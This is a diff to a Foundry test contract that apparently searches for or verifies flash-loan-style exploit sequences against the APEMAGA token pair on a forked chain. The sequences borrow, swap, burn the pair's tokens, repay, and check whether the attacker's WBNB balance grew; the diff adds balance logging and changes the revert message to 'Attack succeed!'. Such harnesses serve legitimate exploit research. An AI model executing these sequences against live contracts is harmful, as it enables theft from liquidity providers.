@@ -130,7 +130,9 @@ contract APEMAGATest is Test, BlockLoader {
         emit log_string("");
     }
 
-    function attackGoal() public view returns (bool) {
+    function attackGoal() public returns (bool) {
+        emit log_named_uint("StartBalance", balanceOfwbnbattacker);
+        emit log_named_uint("FinalBalance", wbnb.balanceOf(attacker));
         return wbnb.balanceOf(attacker) >= 1e12 + balanceOfwbnbattacker;
     }
 
@@ -190,7 +192,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_wbnb_apemaga(amt1, amt2);
         swap_pair_attacker_apemaga_wbnb(amt3, amt4);
         payback_wbnb_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -210,7 +212,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_wbnb_apemaga(amt2, amt3);
         swap_pair_attacker_apemaga_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -230,7 +232,7 @@ contract APEMAGATest is Test, BlockLoader {
         burn_apemaga_pair(amt3);
         swap_pair_attacker_apemaga_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -248,7 +250,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_apemaga_wbnb(amt1, amt2);
         swap_pair_attacker_wbnb_apemaga(amt3, amt4);
         payback_apemaga_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -268,7 +270,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_apemaga_wbnb(amt2, amt3);
         swap_pair_attacker_wbnb_apemaga(amt4, amt5);
         payback_apemaga_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -288,7 +290,7 @@ contract APEMAGATest is Test, BlockLoader {
         burn_apemaga_pair(amt3);
         swap_pair_attacker_wbnb_apemaga(amt4, amt5);
         payback_apemaga_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -312,7 +314,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_wbnb_apemaga(amt5, amt6);
         swap_pair_attacker_apemaga_wbnb(amt7, amt8);
         payback_wbnb_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -338,7 +340,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_wbnb_apemaga(amt6, amt7);
         swap_pair_attacker_apemaga_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -364,7 +366,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_wbnb_apemaga(amt6, amt7);
         swap_pair_attacker_apemaga_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -390,7 +392,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_wbnb_apemaga(amt6, amt7);
         swap_pair_attacker_apemaga_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -416,7 +418,7 @@ contract APEMAGATest is Test, BlockLoader {
         burn_apemaga_pair(amt7);
         swap_pair_attacker_apemaga_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -440,7 +442,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_apemaga_wbnb(amt5, amt6);
         swap_pair_attacker_wbnb_apemaga(amt7, amt8);
         payback_apemaga_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -466,7 +468,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_apemaga_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_apemaga(amt8, amt9);
         payback_apemaga_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -492,7 +494,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_apemaga_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_apemaga(amt8, amt9);
         payback_apemaga_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -518,7 +520,7 @@ contract APEMAGATest is Test, BlockLoader {
         swap_pair_attacker_apemaga_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_apemaga(amt8, amt9);
         payback_apemaga_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -544,7 +546,7 @@ contract APEMAGATest is Test, BlockLoader {
         burn_apemaga_pair(amt7);
         swap_pair_attacker_wbnb_apemaga(amt8, amt9);
         payback_apemaga_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -583,7 +585,7 @@ contract APEMAGATest is Test, BlockLoader {
         borrow_wbnb_owner(amt0);
         swap_pair_attacker_wbnb_apemaga(amt1, amt2);
         burn_apemaga_pair(amt3);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
